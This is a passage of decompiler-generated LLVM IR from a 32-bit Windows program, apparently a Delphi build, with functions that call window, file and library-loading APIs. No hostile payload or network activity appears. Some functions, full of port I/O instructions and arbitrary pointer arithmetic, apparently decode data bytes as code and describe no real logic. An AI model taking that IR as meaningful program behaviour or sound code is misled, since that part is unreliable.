  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4221756 to i32*), i32 -4, i32 %3), !insn.addr !1654
  ret i32 %4, !insn.addr !1655
}

define i32 @function_406bed(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406bed:
  %merge.reg2mem = alloca i32, !insn.addr !1656
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1656
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1656
  store i8 %3, i8* %4, align 1, !insn.addr !1656
  %5 = add i32 %1, 114, !insn.addr !1657
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1657
  %7 = load i8, i8* %6, align 1, !insn.addr !1657
  %8 = udiv i32 %0, 256, !insn.addr !1657
  %9 = trunc i32 %8 to i8, !insn.addr !1657
  %10 = add i8 %7, %9, !insn.addr !1657
  store i8 %10, i8* %6, align 1, !insn.addr !1657
  %11 = add i8 %2, -32, !insn.addr !1658
  %12 = icmp ult i8 %2, 32, !insn.addr !1658
  %13 = icmp eq i8 %11, 0, !insn.addr !1658
  %14 = zext i8 %11 to i32, !insn.addr !1658
  %15 = and i32 %1, -256, !insn.addr !1658
  %16 = or i32 %15, %14, !insn.addr !1658
  %17 = or i1 %12, %13, !insn.addr !1659
  store i32 %16, i32* %merge.reg2mem, !insn.addr !1659
  br i1 %17, label %dec_label_pc_406bf6, label %dec_label_pc_406c65, !insn.addr !1659

dec_label_pc_406bf6:                              ; preds = %dec_label_pc_406bed
  %18 = add i32 %16, 105, !insn.addr !1660
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1660
  %20 = load i8, i8* %19, align 1, !insn.addr !1660
  %21 = and i8 %20, %9, !insn.addr !1660
  store i8 %21, i8* %19, align 1, !insn.addr !1660
  %22 = trunc i32 %arg3 to i16, !insn.addr !1661
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1661
  %24 = load i8, i8* %23, align 1, !insn.addr !1661
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1661
  %25 = add i32 %arg5, 105, !insn.addr !1662
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1662
  %28 = load i8, i8* %27, align 1, !insn.addr !1662
  %29 = udiv i32 %arg2, 256, !insn.addr !1662
  %30 = trunc i32 %29 to i8, !insn.addr !1662
  %31 = and i8 %28, %30, !insn.addr !1662
  store i8 %31, i8* %27, align 1, !insn.addr !1662
  %32 = mul i32 %arg5, 2, !insn.addr !1663
  %33 = add i32 %arg2, 115, !insn.addr !1663
  %34 = add i32 %33, %32, !insn.addr !1663
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1663
  %36 = load i8, i8* %35, align 1, !insn.addr !1663
  %37 = trunc i32 %arg2 to i8, !insn.addr !1663
  %38 = add i8 %36, %37, !insn.addr !1663
  %39 = icmp eq i8 %38, 0, !insn.addr !1663
  store i8 %38, i8* %35, align 1, !insn.addr !1663
  br i1 %39, label %dec_label_pc_406c47, label %dec_label_pc_406c05, !insn.addr !1664

dec_label_pc_406c05:                              ; preds = %dec_label_pc_406bf6
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1665
  %41 = load i32, i32* %40, align 4, !insn.addr !1665
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1665
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1666
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1666
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1666
  %45 = icmp eq i32* %43, null, !insn.addr !1667
  %46 = icmp eq i1 %45, false, !insn.addr !1668
  store i32 %44, i32* %merge.reg2mem, !insn.addr !1668
  br i1 %46, label %dec_label_pc_406c65, label %dec_label_pc_406c29, !insn.addr !1668

dec_label_pc_406c29:                              ; preds = %dec_label_pc_406c05
  %47 = call i32 @function_406bb8(), !insn.addr !1669
  %48 = call i32 @function_4036c8(), !insn.addr !1670
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1671
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1672
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1672
  ret i32 %51, !insn.addr !1673

dec_label_pc_406c47:                              ; preds = %dec_label_pc_406bf6
  %52 = call i32 @__asm_insd(i16 %22), !insn.addr !1674
  %53 = inttoptr i32 %arg7 to i32*, !insn.addr !1674
  store i32 %52, i32* %53, align 4, !insn.addr !1674
  %54 = add i32 %arg1, 1, !insn.addr !1675
  %55 = add i32 %29, %54, !insn.addr !1676
  %56 = and i32 %55, 255, !insn.addr !1676
  %57 = and i32 %54, -256, !insn.addr !1676
  %58 = or i32 %56, %57, !insn.addr !1676
  ret i32 %58, !insn.addr !1677

dec_label_pc_406c65:                              ; preds = %dec_label_pc_406c05, %dec_label_pc_406bed
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !1677
}

define i32 @function_406d0d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406d0d:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1678
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1678
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1678
  %9 = add i8 %6, %8, !insn.addr !1678
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1678
  store i8 %9, i8* %10, align 1, !insn.addr !1678
  %11 = load i32, i32* %eax, align 4, !insn.addr !1679
  %12 = add i32 %11, 114, !insn.addr !1679
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1679
  %14 = load i8, i8* %13, align 1, !insn.addr !1679
  %15 = udiv i32 %2, 256, !insn.addr !1679
  %16 = trunc i32 %15 to i8, !insn.addr !1679
  %17 = add i8 %14, %16, !insn.addr !1679
  store i8 %17, i8* %13, align 1, !insn.addr !1679
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1680
  %20 = add i8 %19, -32, !insn.addr !1680
  %21 = icmp ult i8 %19, 32, !insn.addr !1680
  %22 = icmp eq i8 %20, 0, !insn.addr !1680
  %23 = zext i8 %20 to i32, !insn.addr !1680
  %24 = and i32 %18, -256, !insn.addr !1680
  %25 = or i32 %24, %23, !insn.addr !1680
  store i32 %25, i32* %eax, align 4, !insn.addr !1680
  %26 = or i1 %21, %22, !insn.addr !1681
  br i1 %26, label %dec_label_pc_406d16, label %dec_label_pc_406d85, !insn.addr !1681

dec_label_pc_406d16:                              ; preds = %dec_label_pc_406d0d
  %27 = add i32 %25, 105, !insn.addr !1682
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1682
  %29 = load i8, i8* %28, align 1, !insn.addr !1682
  %30 = and i8 %29, %16, !insn.addr !1682
  store i8 %30, i8* %28, align 1, !insn.addr !1682
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1683
  store i32 %31, i32* %eax, align 4, !insn.addr !1683
  %32 = trunc i32 %arg3 to i16, !insn.addr !1684
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1684
  %34 = load i8, i8* %33, align 1, !insn.addr !1684
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1684
  %35 = add i32 %arg5, 105, !insn.addr !1685
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1685
  %38 = load i8, i8* %37, align 1, !insn.addr !1685
  %39 = udiv i32 %arg2, 256, !insn.addr !1685
  %40 = trunc i32 %39 to i8, !insn.addr !1685
  %41 = and i8 %38, %40, !insn.addr !1685
  store i8 %41, i8* %37, align 1, !insn.addr !1685
  %42 = mul i32 %arg5, 2, !insn.addr !1686
  %43 = add i32 %arg2, 115, !insn.addr !1686
  %44 = add i32 %43, %42, !insn.addr !1686
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1686
  %46 = load i8, i8* %45, align 1, !insn.addr !1686
  %47 = trunc i32 %arg2 to i8, !insn.addr !1686
  %48 = add i8 %46, %47, !insn.addr !1686
  %49 = icmp eq i8 %48, 0, !insn.addr !1686
  store i8 %48, i8* %45, align 1, !insn.addr !1686
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1687
  br i1 %49, label %dec_label_pc_406d67, label %dec_label_pc_406d25, !insn.addr !1687

dec_label_pc_406d25:                              ; preds = %dec_label_pc_406d16
  %50 = icmp slt i8 %48, 0, !insn.addr !1686
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1688
  %52 = load i32, i32* %51, align 4, !insn.addr !1688
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1688
  br i1 %50, label %dec_label_pc_406d9c, label %dec_label_pc_406d2a, !insn.addr !1689

dec_label_pc_406d2a:                              ; preds = %dec_label_pc_406d25
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1690
  %55 = add i8 %54, -32, !insn.addr !1690
  %56 = icmp ult i8 %54, 32, !insn.addr !1690
  %57 = icmp eq i8 %55, 0, !insn.addr !1690
  %58 = zext i8 %55 to i32, !insn.addr !1690
  %59 = and i32 %53, -256, !insn.addr !1690
  %60 = or i32 %59, %58, !insn.addr !1690
  store i32 %60, i32* %eax, align 4, !insn.addr !1690
  %61 = or i1 %56, %57, !insn.addr !1691
  br i1 %61, label %dec_label_pc_406d2e, label %dec_label_pc_406d9d, !insn.addr !1691

dec_label_pc_406d2e:                              ; preds = %dec_label_pc_406d2a
  %62 = add i32 %arg2, 105, !insn.addr !1692
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1692
  %64 = load i8, i8* %63, align 1, !insn.addr !1692
  %65 = udiv i32 %53, 256, !insn.addr !1692
  %66 = trunc i32 %65 to i8, !insn.addr !1692
  %67 = and i8 %64, %66, !insn.addr !1692
  store i8 %67, i8* %63, align 1, !insn.addr !1692
  %68 = add i32 %arg6, 105, !insn.addr !1693
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1693
  %70 = load i8, i8* %69, align 1, !insn.addr !1693
  %71 = and i8 %70, %40, !insn.addr !1693
  store i8 %71, i8* %69, align 1, !insn.addr !1693
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1694
  %74 = load i8, i8* %73, align 1, !insn.addr !1694
  %75 = trunc i32 %72 to i8, !insn.addr !1694
  %76 = add i8 %74, %75, !insn.addr !1694
  store i8 %76, i8* %73, align 1, !insn.addr !1694
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1695
  %79 = load i8, i8* %78, align 1, !insn.addr !1695
  %80 = trunc i32 %77 to i8, !insn.addr !1695
  %81 = add i8 %79, %80, !insn.addr !1695
  store i8 %81, i8* %78, align 1, !insn.addr !1695
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1696
  %83 = load i32, i32* %82, align 4, !insn.addr !1696
  %84 = add i32 %83, %arg6, !insn.addr !1696
  store i32 %84, i32* %82, align 4, !insn.addr !1696
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1697
  %87 = load i8, i8* %86, align 1, !insn.addr !1697
  %88 = trunc i32 %85 to i8, !insn.addr !1697
  %89 = add i8 %87, %88, !insn.addr !1697
  store i8 %89, i8* %86, align 1, !insn.addr !1697
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1698
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1699
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1699
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1699
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1700
  %92 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1701
  %93 = add i32 %92, 1, !insn.addr !1701
  %94 = icmp eq i32 %93, 0, !insn.addr !1701
  store i32 %93, i32* @global_var_4096d8, align 4, !insn.addr !1701
  %95 = icmp eq i1 %94, false, !insn.addr !1702
  br i1 %95, label %dec_label_pc_406d5f, label %dec_label_pc_406d55, !insn.addr !1702

dec_label_pc_406d55:                              ; preds = %dec_label_pc_406d2e
  %96 = call i32 @"@LStrClr"(), !insn.addr !1703
  br label %dec_label_pc_406d5f, !insn.addr !1703

dec_label_pc_406d5f:                              ; preds = %dec_label_pc_406d55, %dec_label_pc_406d2e
  store i32 0, i32* %eax, align 4, !insn.addr !1704
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1705
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1706
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1706
  br label %dec_label_pc_406d67, !insn.addr !1706

dec_label_pc_406d67:                              ; preds = %dec_label_pc_406d5f, %dec_label_pc_406d16
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1707
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1707
  store i32 4222324, i32* %99, align 4, !insn.addr !1707
  %100 = load i32, i32* %eax, align 4, !insn.addr !1708
  ret i32 %100, !insn.addr !1708

dec_label_pc_406d85:                              ; preds = %dec_label_pc_406d0d
  %101 = mul i32 %4, 2, !insn.addr !1709
  %102 = add i32 %1, 105, !insn.addr !1709
  %103 = add i32 %102, %101, !insn.addr !1709
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1709
  %105 = load i32, i32* %104, align 4, !insn.addr !1709
  %106 = or i32 %105, %3, !insn.addr !1709
  store i32 %106, i32* %104, align 4, !insn.addr !1709
  %107 = add i32 %0, -1, !insn.addr !1710
  %108 = trunc i32 %3 to i16, !insn.addr !1711
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1711
  %110 = load i32, i32* %109, align 4, !insn.addr !1711
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1711
  %111 = load i32, i32* %eax, align 4, !insn.addr !1712
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1712
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1712
  %115 = or i8 %112, %114, !insn.addr !1712
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1712
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1713
  %118 = load i8, i8* %117, align 1, !insn.addr !1713
  %119 = trunc i32 %116 to i8, !insn.addr !1713
  %120 = add i8 %118, %119, !insn.addr !1713
  store i8 %120, i8* %117, align 1, !insn.addr !1713
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1714
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1714
  %124 = load i8, i8* %123, align 1, !insn.addr !1714
  %125 = add i8 %124, %122, !insn.addr !1714
  %126 = zext i8 %125 to i32, !insn.addr !1714
  %127 = and i32 %121, -256, !insn.addr !1714
  %128 = or i32 %127, %126, !insn.addr !1714
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1715
  %130 = load i8, i8* %129, align 1, !insn.addr !1715
  %131 = trunc i32 %3 to i8, !insn.addr !1716
  %132 = add i8 %125, %131, !insn.addr !1715
  %133 = add i8 %132, %130, !insn.addr !1716
  store i8 %133, i8* %129, align 1, !insn.addr !1716
  %134 = add i32 %128, 1, !insn.addr !1717
  store i32 %134, i32* %eax, align 4, !insn.addr !1717
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1718
  %136 = load i8, i8* %135, align 1, !insn.addr !1718
  %137 = trunc i32 %134 to i8, !insn.addr !1718
  %138 = add i8 %136, %137, !insn.addr !1718
  store i8 %138, i8* %135, align 1, !insn.addr !1718
  br label %dec_label_pc_406d9c, !insn.addr !1718

dec_label_pc_406d9c:                              ; preds = %dec_label_pc_406d85, %dec_label_pc_406d25
  %139 = load i32, i32* %eax, align 4, !insn.addr !1718
  ret i32 %139, !insn.addr !1718

dec_label_pc_406d9d:                              ; preds = %dec_label_pc_406d2a
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1719
  %141 = load i8, i8* %140, align 1, !insn.addr !1719
  %142 = add i8 %141, %55, !insn.addr !1719
  store i8 %142, i8* %140, align 1, !insn.addr !1719
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1720
  %145 = load i8, i8* %144, align 1, !insn.addr !1720
  %146 = trunc i32 %arg3 to i8, !insn.addr !1720
  %147 = add i8 %145, %146, !insn.addr !1720
  store i8 %147, i8* %144, align 1, !insn.addr !1720
  %148 = load i32, i32* %eax, align 4, !insn.addr !1721
  %149 = add i32 %148, 1, !insn.addr !1721
  %150 = mul i32 %149, 2, !insn.addr !1722
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1722
  %152 = load i8, i8* %151, align 2, !insn.addr !1722
  %153 = trunc i32 %149 to i8, !insn.addr !1722
  %154 = add i8 %152, %153, !insn.addr !1722
  store i8 %154, i8* %151, align 2, !insn.addr !1722
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1723
  %156 = load i8, i8* %155, align 1, !insn.addr !1723
  %157 = add i8 %156, %153, !insn.addr !1723
  store i8 %157, i8* %155, align 1, !insn.addr !1723
  ret i32 %149, !insn.addr !1724
}

define i32 @function_406dc8() local_unnamed_addr {
dec_label_pc_406dc8:
  %esp.1.reg2mem = alloca i32, !insn.addr !1725
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1726
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1726
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1726
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1727
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1728
  %3 = call i32 @function_4036c8(), !insn.addr !1729
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1730
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1730
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1730
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1731
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1732
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1733
  br i1 %7, label %dec_label_pc_406f67, label %dec_label_pc_406e32, !insn.addr !1733

dec_label_pc_406e32:                              ; preds = %dec_label_pc_406dc8
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1731
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1734
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1734
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1735
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1736
  br i1 %12, label %dec_label_pc_406f67, label %dec_label_pc_406e4e, !insn.addr !1736

dec_label_pc_406e4e:                              ; preds = %dec_label_pc_406e32
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1737
  %14 = call i32 @function_403720(), !insn.addr !1738
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1739
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1739
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1740
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1740
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1741
  %19 = call i32 @function_4046d4(), !insn.addr !1742
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406f67

dec_label_pc_406f67:                              ; preds = %dec_label_pc_406e4e, %dec_label_pc_406e32, %dec_label_pc_406dc8
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1743
  %21 = load i32, i32* %20, align 4, !insn.addr !1743
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1744
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1745
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1745
  store i32 4222857, i32* %23, align 4, !insn.addr !1745
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1746
  ret i32 %24, !insn.addr !1747
}

define i32 @function_406f82() local_unnamed_addr {
dec_label_pc_406f82:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1748
  ret i32 %0, !insn.addr !1748
}

define i32 @function_406f87() local_unnamed_addr {
dec_label_pc_406f87:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1749
}

define i32 @function_406f89(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406f89:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1750
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1750
  %3 = load i32, i32* %2, align 4, !insn.addr !1750
  ret i32 %3, !insn.addr !1751
}

define i32 @function_406fc0() local_unnamed_addr {
dec_label_pc_406fc0:
  %esp.2.reg2mem = alloca i32, !insn.addr !1752
  %esp.1.reg2mem = alloca i32, !insn.addr !1752
  %esi.0.reg2mem = alloca i32, !insn.addr !1752
  %esp.0.reg2mem = alloca i32, !insn.addr !1752
  %ebx.0.reg2mem = alloca i32, !insn.addr !1752
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1753
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1754
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1754
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1754
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1755
  %2 = call i32 @function_403c88(), !insn.addr !1756
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1757
  br i1 %3, label %dec_label_pc_4070a9, label %dec_label_pc_406fee, !insn.addr !1757

dec_label_pc_406fee:                              ; preds = %dec_label_pc_406fc0
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1758
  %5 = call i32 @function_4036c8(), !insn.addr !1759
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1760
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1760
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1760
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1761
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1762
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1763
  br i1 %9, label %dec_label_pc_4070a9, label %dec_label_pc_40702a, !insn.addr !1763

dec_label_pc_40702a:                              ; preds = %dec_label_pc_406fee
  %10 = call i32 @"@LStrClr"(), !insn.addr !1764
  %11 = call i32 @function_403c90(), !insn.addr !1765
  %12 = icmp slt i32 %11, 0, !insn.addr !1766
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1767
  br i1 %12, label %dec_label_pc_407074, label %dec_label_pc_407042, !insn.addr !1767

dec_label_pc_407042:                              ; preds = %dec_label_pc_40702a
  %13 = add i32 %11, 1, !insn.addr !1768
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1769
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1769
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1769
  br label %dec_label_pc_407045, !insn.addr !1769

dec_label_pc_407045:                              ; preds = %dec_label_pc_407045, %dec_label_pc_407042
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1770
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1770
  store i32 0, i32* %15, align 4, !insn.addr !1770
  %16 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1771
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1772
  %18 = add i32 %16, %17, !insn.addr !1772
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1772
  %20 = load i32, i32* %19, align 4, !insn.addr !1772
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1772
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1772
  store i32 %20, i32* %22, align 4, !insn.addr !1772
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1773
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1773
  store i32 ptrtoint (i32* @global_var_4070f0 to i32), i32* %24, align 4, !insn.addr !1773
  %25 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1774
  %26 = or i32 %17, 4, !insn.addr !1775
  %27 = add i32 %25, %26, !insn.addr !1775
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1775
  %29 = load i32, i32* %28, align 4, !insn.addr !1775
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1775
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1775
  store i32 %29, i32* %31, align 4, !insn.addr !1775
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1776
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1776
  store i32 ptrtoint ([3 x i8]* @global_var_4070fc to i32), i32* %33, align 4, !insn.addr !1776
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1777
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1778
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1779
  %37 = icmp eq i32 %36, 0, !insn.addr !1779
  %38 = icmp eq i1 %37, false, !insn.addr !1780
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1780
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1780
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1780
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1780
  br i1 %38, label %dec_label_pc_407045, label %dec_label_pc_407074, !insn.addr !1780

dec_label_pc_407074:                              ; preds = %dec_label_pc_407045, %dec_label_pc_40702a
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1761
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1781
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1782
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1782
  store i32 0, i32* %42, align 4, !insn.addr !1782
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1783
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1783
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1783
  store i32 %45, i32* %44, align 4, !insn.addr !1783
  %46 = call i32 @function_4034c8(), !insn.addr !1784
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1785
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1785
  store i32 %46, i32* %48, align 4, !insn.addr !1785
  %49 = call i32 @function_403720(), !insn.addr !1786
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1787
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1787
  store i32 %49, i32* %51, align 4, !insn.addr !1787
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1788
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1788
  store i32 %39, i32* %53, align 4, !insn.addr !1788
  %54 = call i32 @function_40446c(), !insn.addr !1789
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1790
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1790
  store i32 %39, i32* %56, align 4, !insn.addr !1790
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1791
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1792
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1792
  store i32 %39, i32* %59, align 4, !insn.addr !1792
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1793
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1794
  br label %dec_label_pc_4070a9, !insn.addr !1794

dec_label_pc_4070a9:                              ; preds = %dec_label_pc_407074, %dec_label_pc_406fee, %dec_label_pc_406fc0
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1795
  %62 = load i32, i32* %61, align 4, !insn.addr !1795
